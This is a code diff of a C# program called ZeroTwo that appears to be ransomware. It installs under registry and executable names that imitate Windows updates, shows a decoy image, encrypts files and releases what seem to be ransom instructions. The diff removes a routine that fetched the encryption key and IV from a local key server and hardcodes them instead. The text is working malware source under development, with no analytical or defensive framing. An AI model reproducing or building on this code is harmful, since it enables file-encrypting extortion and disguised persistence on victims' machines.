@@ -22,8 +22,8 @@ namespace ZeroTwo.src {
         private const string REG_KEY = "UpdatesHandler";
         private const string EXE_NAME = "WinUpdates";
 
-        private static byte[] k = null;
-        private static byte[] s = null;
+        private static byte[] k = Encoding.ASCII.GetBytes("0202020202020202");
+        private static byte[] s = Encoding.ASCII.GetBytes("02020202");
 
         public static void Main(string[] args) {
             if (args.Length == 0) {
@@ -31,25 +31,11 @@ namespace ZeroTwo.src {
                 ExtrRes();
                 OpenImage();
             } else {
-                SetKandS();
                 int op = int.Parse(args[0]);
                 Exec(op);
                 if (op == ENC) {
                     ReleaseIstructions();
                 }
-            }
-        }
-        public static void SetKandS() {
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://localhost:5000/get");
-            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
-            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-            using (Stream stream = response.GetResponseStream())
-            using (StreamReader reader = new StreamReader(stream)) {
-                JavaScriptSerializer serializer = new JavaScriptSerializer();
-                Resp resp = serializer.Deserialize<Resp>(reader.ReadToEnd());
-                Console.WriteLine(s);
-                k = Encoding.ASCII.GetBytes(resp.k);
-                s = Encoding.ASCII.GetBytes(resp.s);
             }
         }
 
